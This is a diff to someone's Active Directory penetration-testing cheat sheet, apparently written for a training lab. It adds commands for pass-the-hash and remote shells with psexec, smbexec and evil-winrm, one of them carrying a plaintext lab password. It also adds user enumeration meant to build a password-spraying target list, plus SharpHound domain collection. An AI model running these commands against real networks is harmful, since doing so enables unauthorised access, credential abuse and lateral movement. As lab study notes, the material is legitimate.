@@ -40,8 +40,10 @@ nxc smb <SUBNET> -u '' -p '' --local-auth
 nxc smb <SUBNET> -u UserNAme -H 'LM:NT' -x whoami --local-auth
 nxc smb <SUBNET> -u UserNAme -H 'NTHASH' -x whoami --local-auth
 
-# psexec (get shell)
+# psexec (slow shell)
 psexec.py <DOMAIN.LOCAL>/<USER>@<DC01.DOMIAN.LOCAL> -target-ip <Computer-Target-IP>
+# smbexec (faster shell)
+smbexec.py INLANEFREIGHT.LOCAL/CT059:charlie1@DC01.INLANEFREIGHT.LOCAL -target-ip DC01
 
 # Evil-WinRM
 evil-winrm -i <TARGET-IP> -u <USER> -p '<PASSWORD>'  # Remote shell as <USER>
@@ -128,7 +130,11 @@ We'll start by using the SMB protocol to enumerate users and groups. We will tar
 #### CME - Domain User Enumeration
 
 ```bash
-sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --users
+sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --users 
+# to save them
+sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --users > enum_users.txt
+  # enum_users.txt
+awk -F'[\\ ]+' '{print $2}' enum-users.txt | sort -u > users.txt  
 ```
 >  it includes data points such as the **badPwdCount** attribute. so in password spraying ithis will help to build a target user list filtering out any users with their badPwdCount attribute above 0
 
@@ -463,9 +469,9 @@ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
  ==For our purposes, we will work with SharpHound.exe already on the attack host=
  
 ```powershell
-.\SharpHound.exe -c All --zipfilename <zipFileName> # on domain joined
+.\SharpHound.exe -c All --zipfilename <zipFileName> --outputdirectory C:\Windows\Temp # on domain joined
 
-# remotly 
+# remotly  (with winrm)
 .\SharpHound.exe -c All --zipfilename out --domain <DOMAIN.LOCAL> --ldapusername "<USER@DOMAIN.LOCAL>" --ldappassword '<PASSWORD>'
 ```
 
